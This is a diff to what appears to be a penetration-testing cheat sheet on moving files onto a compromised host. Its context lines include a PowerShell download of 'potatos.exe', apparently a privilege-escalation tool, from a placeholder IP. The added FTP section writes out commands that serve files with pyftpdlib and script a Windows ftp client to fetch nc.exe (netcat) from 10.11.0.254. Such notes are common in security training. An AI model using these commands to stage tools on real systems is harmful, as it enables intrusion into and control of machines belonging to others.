@@ -53,3 +53,26 @@ powershell -command "& { iwr http://xx.xx.xx.xx:8000/potatos.exe -OutFile potato
 wget -O filename http://xxx.xxx.xxx/filename
 
 curl -o filename http://xxx.xxx.xxx.xxx/filename
+
+## FTP transfer
+
+You can start FTP on linux box with this command
+
+```sh
+python3 -m pyftpdlib -p 21 
+```
+
+Then you can transfer with these commands
+
+```sh
+echo open 10.11.0.254 21> ftp.txt
+echo USER anonymous>> ftp.txt
+echo password>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+
+ftp -v -n -s:ftp.txt
+```
+
+
